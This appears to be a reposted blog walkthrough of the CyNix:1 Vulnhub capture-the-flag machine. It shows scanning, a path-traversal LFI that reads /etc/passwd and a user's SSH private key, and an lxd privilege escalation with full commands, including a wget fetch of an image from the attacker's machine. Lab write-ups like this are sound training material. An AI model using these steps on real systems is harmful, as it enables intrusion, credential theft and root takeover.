---
title: 'CyNix:1 Vulnhub Walkthrough'
date: 2020-01-19T17:47:00+01:00
draft: false
---

Today we are sharing another CTF Walkthrough named Cynix Post by Vulnerhub and credit goes to “Sumit Verma” and the level difficulty is set Intermediate-Hard. You have to hunt two flags, and this is a boot to root challenge. Download it from **[here](https://www.vulnhub.com/entry/cynix-1,394/)**.

### **Table of Content**

**Network scanning**

*   Netdiscover
*   Nmap

**Enumeration**

*   Abusing HTTP
*   Dirbuster

**Exploiting LFI**

*   Burp Suite

**Privilege Escalation**

*   Lxd

**Walkthrough**

**Network Scanning**

As you know, this is the initial phase where we choose netdiscover for network scan for identifying host IP and this we have 192.168.1.105 as our host IP.

![](https://i0.wp.com/1.bp.blogspot.com/-o6bSaV5KbYQ/XiR-v44PIQI/AAAAAAAAiOQ/JbIXdDtHrtc41Y_Iob3mHyeKtU8T2aYtQCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

In our next step, we love to use nmap for network ports enumeration, thus we run following command and found port 80 is open for HTTP and 6688 is open for SSH and also the host operating system is Linux based OS.

```
nmap -p- -A 192.168.1.105
```

![](https://i0.wp.com/1.bp.blogspot.com/-Udl01I4MMkI/XiR-zB_cPxI/AAAAAAAAiO0/9KeMMoUgSwcJOjnp37JWCDVpRR0FF0IgQCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### **Enumeration**

After network scanning, the enumeration is next phase, because it helps a pentester for to dig out suspicious information or loopholes in the installed application, therefore we navigate to a web browser and explored the host IP as shown but unfortunately, we found nothing except apache default page.

![](https://i0.wp.com/1.bp.blogspot.com/-0GHyDYuEeCU/XiR-zsjSFHI/AAAAAAAAiO4/9zfqdSkrDhsHAWxgWg7IVq8xPWuiDJvYQCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

We continue this with the directory brute force attack and the dirbuster used for directory listing. As you can see, we’ve found a directory named /lavalamp to learn more about dirbuster, read the article from **[here](https://www.hackingarticles.in/comprehensive-guide-on-dirbuster-tool/)**.

![](https://i0.wp.com/1.bp.blogspot.com/-DtNinBuwrfA/XiR-z-0UUMI/AAAAAAAAiO8/5o-O2kYMDQkHOs0awGQlZWAG0mdFVM12ACLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

We’re browsing the /lavalamp in the web browser and we’re welcomed by the web page shown in the image. Then we dig more and more, including its source code, but found no hint for the next step.

![](https://i0.wp.com/1.bp.blogspot.com/-Mws8rt-UAhI/XiR-0aNRmOI/AAAAAAAAiPA/t4cNtRkgvoERD6-CWHVb5j3VqdD6DwlHQCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

As a result, we fill out the contact form as shown in the image below and intercept the http request of the browser in the browser.

![](https://i1.wp.com/1.bp.blogspot.com/-5tNFyyjynWA/XiR-0qRJoXI/AAAAAAAAiPE/oi-Atul6Tcou_aut3sM-vFjnRZIY_t2fQCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

The intercepted request shows that here the HTTP Post method is used to submit the request at /canyobypassme.php page.

![](https://i2.wp.com/1.bp.blogspot.com/-L2eC9ygfnM0/XiR-01GzmHI/AAAAAAAAiPI/cTe0xqgK5gU4Jdzodkhqn0QoTMDR3WGkwCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Thus, we navigate to /lavalamp/canyoubypassme.php as found above, an image on the web page shown below.

![](https://i0.wp.com/1.bp.blogspot.com/-fOUZ7dqgUIQ/XiR-2TRIP2I/AAAAAAAAiPM/cvK2r0Oh-dUbgr1kXVBpupXi869esFUCwCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

As the web page displays the image only and it was troubling us, thus, we check its source code and notice a hidden form with **opacity 0:0** inside the web page.

![](https://i2.wp.com/1.bp.blogspot.com/-zhBCTRkTOzI/XiR-2YLFBTI/AAAAAAAAiPQ/w8BjBExDG0AjqzFaJIfZhAi_6jsHTiCowCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

With the help inspect element we changed the **opacity 0:0 to 0:1** and got the form visible on the web page.

![](https://i1.wp.com/1.bp.blogspot.com/-2zETDjFpB0E/XiR-wow8AxI/AAAAAAAAiOY/lh11VsbOyq4FhGJ3mvhiT9WYoUMByTViQCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

Now it was time to intercept the form’s http request by entering a value as a specific number. So, we’ve got the intercepted request in the burpsuite where we’ve seen the parameter “file=1” and maybe there’s a possibility for LFI, so we’ve sent the request to the repeater.

![](https://i0.wp.com/1.bp.blogspot.com/-bwiB8telEZ4/XiR-wJRt3JI/AAAAAAAAiOU/xclv2pSrZB01RSQG5Cszac2yJcxOW-BogCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

For validating LFI we looked for /etc/passwd file by injecting “**../../../etc/passwd”** in the parameter “**file=1**” as checked its response.

Luckily, we found the application is vulnerable to LFI and from its result, we notice record entry for username “ford” and “lxd”

![](https://i1.wp.com/1.bp.blogspot.com/-A5BGYsPTGtY/XiR-xBF9i8I/AAAAAAAAiOc/lJUmTp6Q8xA7XyH8K-syRE1vKHKiak6TgCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

### **Exploiting LFI**

Since ssh is installed on the host machine, so we also check for ssh rsa key by injecting “**../../../home/ford/.ssh/id\_rsa**” in parameter ‘’**file=8**” as result we found **id\_rsa** key for ssh.

![](https://i2.wp.com/1.bp.blogspot.com/-QuiwAZd9ago/XiR-xPB4lbI/AAAAAAAAiOg/mz880kAB0XcmKu-BQhSv5cR3wbdXB4UbQCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

We copied the id\_rsa key in a text document and named it “key” and also grant permission 600, and finally get logged in and spawn the ssh shell of the machine.

```
chmod 600 key  
ssh -i key ford@192.168.1.105
```

we found our fist flag user.txt file inside ford’s /home directory and for privilege escalation, we check user\_id where we saw ford is member of lxd group thus we can be escalated go with lxd privilege escalation which we had explained in our previous **[article](https://www.hackingarticles.in/lxd-privilege-escalation/)**.

![](https://i2.wp.com/1.bp.blogspot.com/-NXCZhtO2qOw/XiR-xoGqT4I/AAAAAAAAiOk/xCjWwGR3l107avx4RQQ_izYt7hQ3IMXbwCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

### Privilege Escalation

In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:

1.  **Steps to be performed on the attacker machine**:

*   Download build-alpine in your local machine through the git repository.
*   Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
*   Transfer the tar file to the host machine

2.  **Steps to be performed on the host machine:**

*   Download the alpine image
*   Import image for lxd
*   Initialize the image inside a new container.
*   Mount the container inside the /root directory

So, we downloaded the build alpine using the GitHub repose.

```
git clone  https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
./build-alpine
```

![](https://i0.wp.com/1.bp.blogspot.com/--mrWopO99uA/XiR-yPoOpWI/AAAAAAAAiOo/qDyu7Br1guAUbABtPbb-pg3f6vxI94O-QCLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

On running the above command, a tar.gz file is created in the working directory that we have transferred to the host machine.

```
python -m SimpleHTTPServer
```

![](https://i0.wp.com/1.bp.blogspot.com/-GTVLrW87S20/XiR-yM64xmI/AAAAAAAAiOs/DPrnAf_IdwAx3mvHAvf76bcPcoLOnACsACLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

On another hand, we will download the alpine-image inside /tmp directory on the host machine.

```
cd /tmp  
wget http://192.168.1.107:8000/apline-v3.10-x86\_64-20191008\_1227.tar.gz
```

After the image is built it can be added as an image to LXD as follows:

```
lxc image import ./apline-v3.10-x86\_64-20191008\_1227.tar.gz --alias myimage
```

Use the list command to check the list of images

```
lxc image list  
lxc init myimage ignite -c security.privileged=true  
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
lxc start ignite  
lxc exec ignite /bin/sh  
id
```

Once inside the container, navigate to /mnt/root to see all resources from the host machine.

After running the bash file. We see that we have a different shell, it is the shell of the container. This container has all the files of the host machine. So, we enumerated for the root flag and found it.

```
mnt/root/root  
ls  
flag.txt  
cat flag.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-2_JVEvFlmVA/XiR-y8Pk1OI/AAAAAAAAiOw/5LcR90XWqWIERKiCJtkU3n-Y7WY-je9qwCLcBGAsYHQ/s1600/19.png?w=687&ssl=1)

**Author**: Pinky Deka is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her [**here**](https://www.linkedin.com/in/pinky-deka/)

The post [CyNix:1 Vulnhub Walkthrough](https://www.hackingarticles.in/cynix1-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/30ETx2n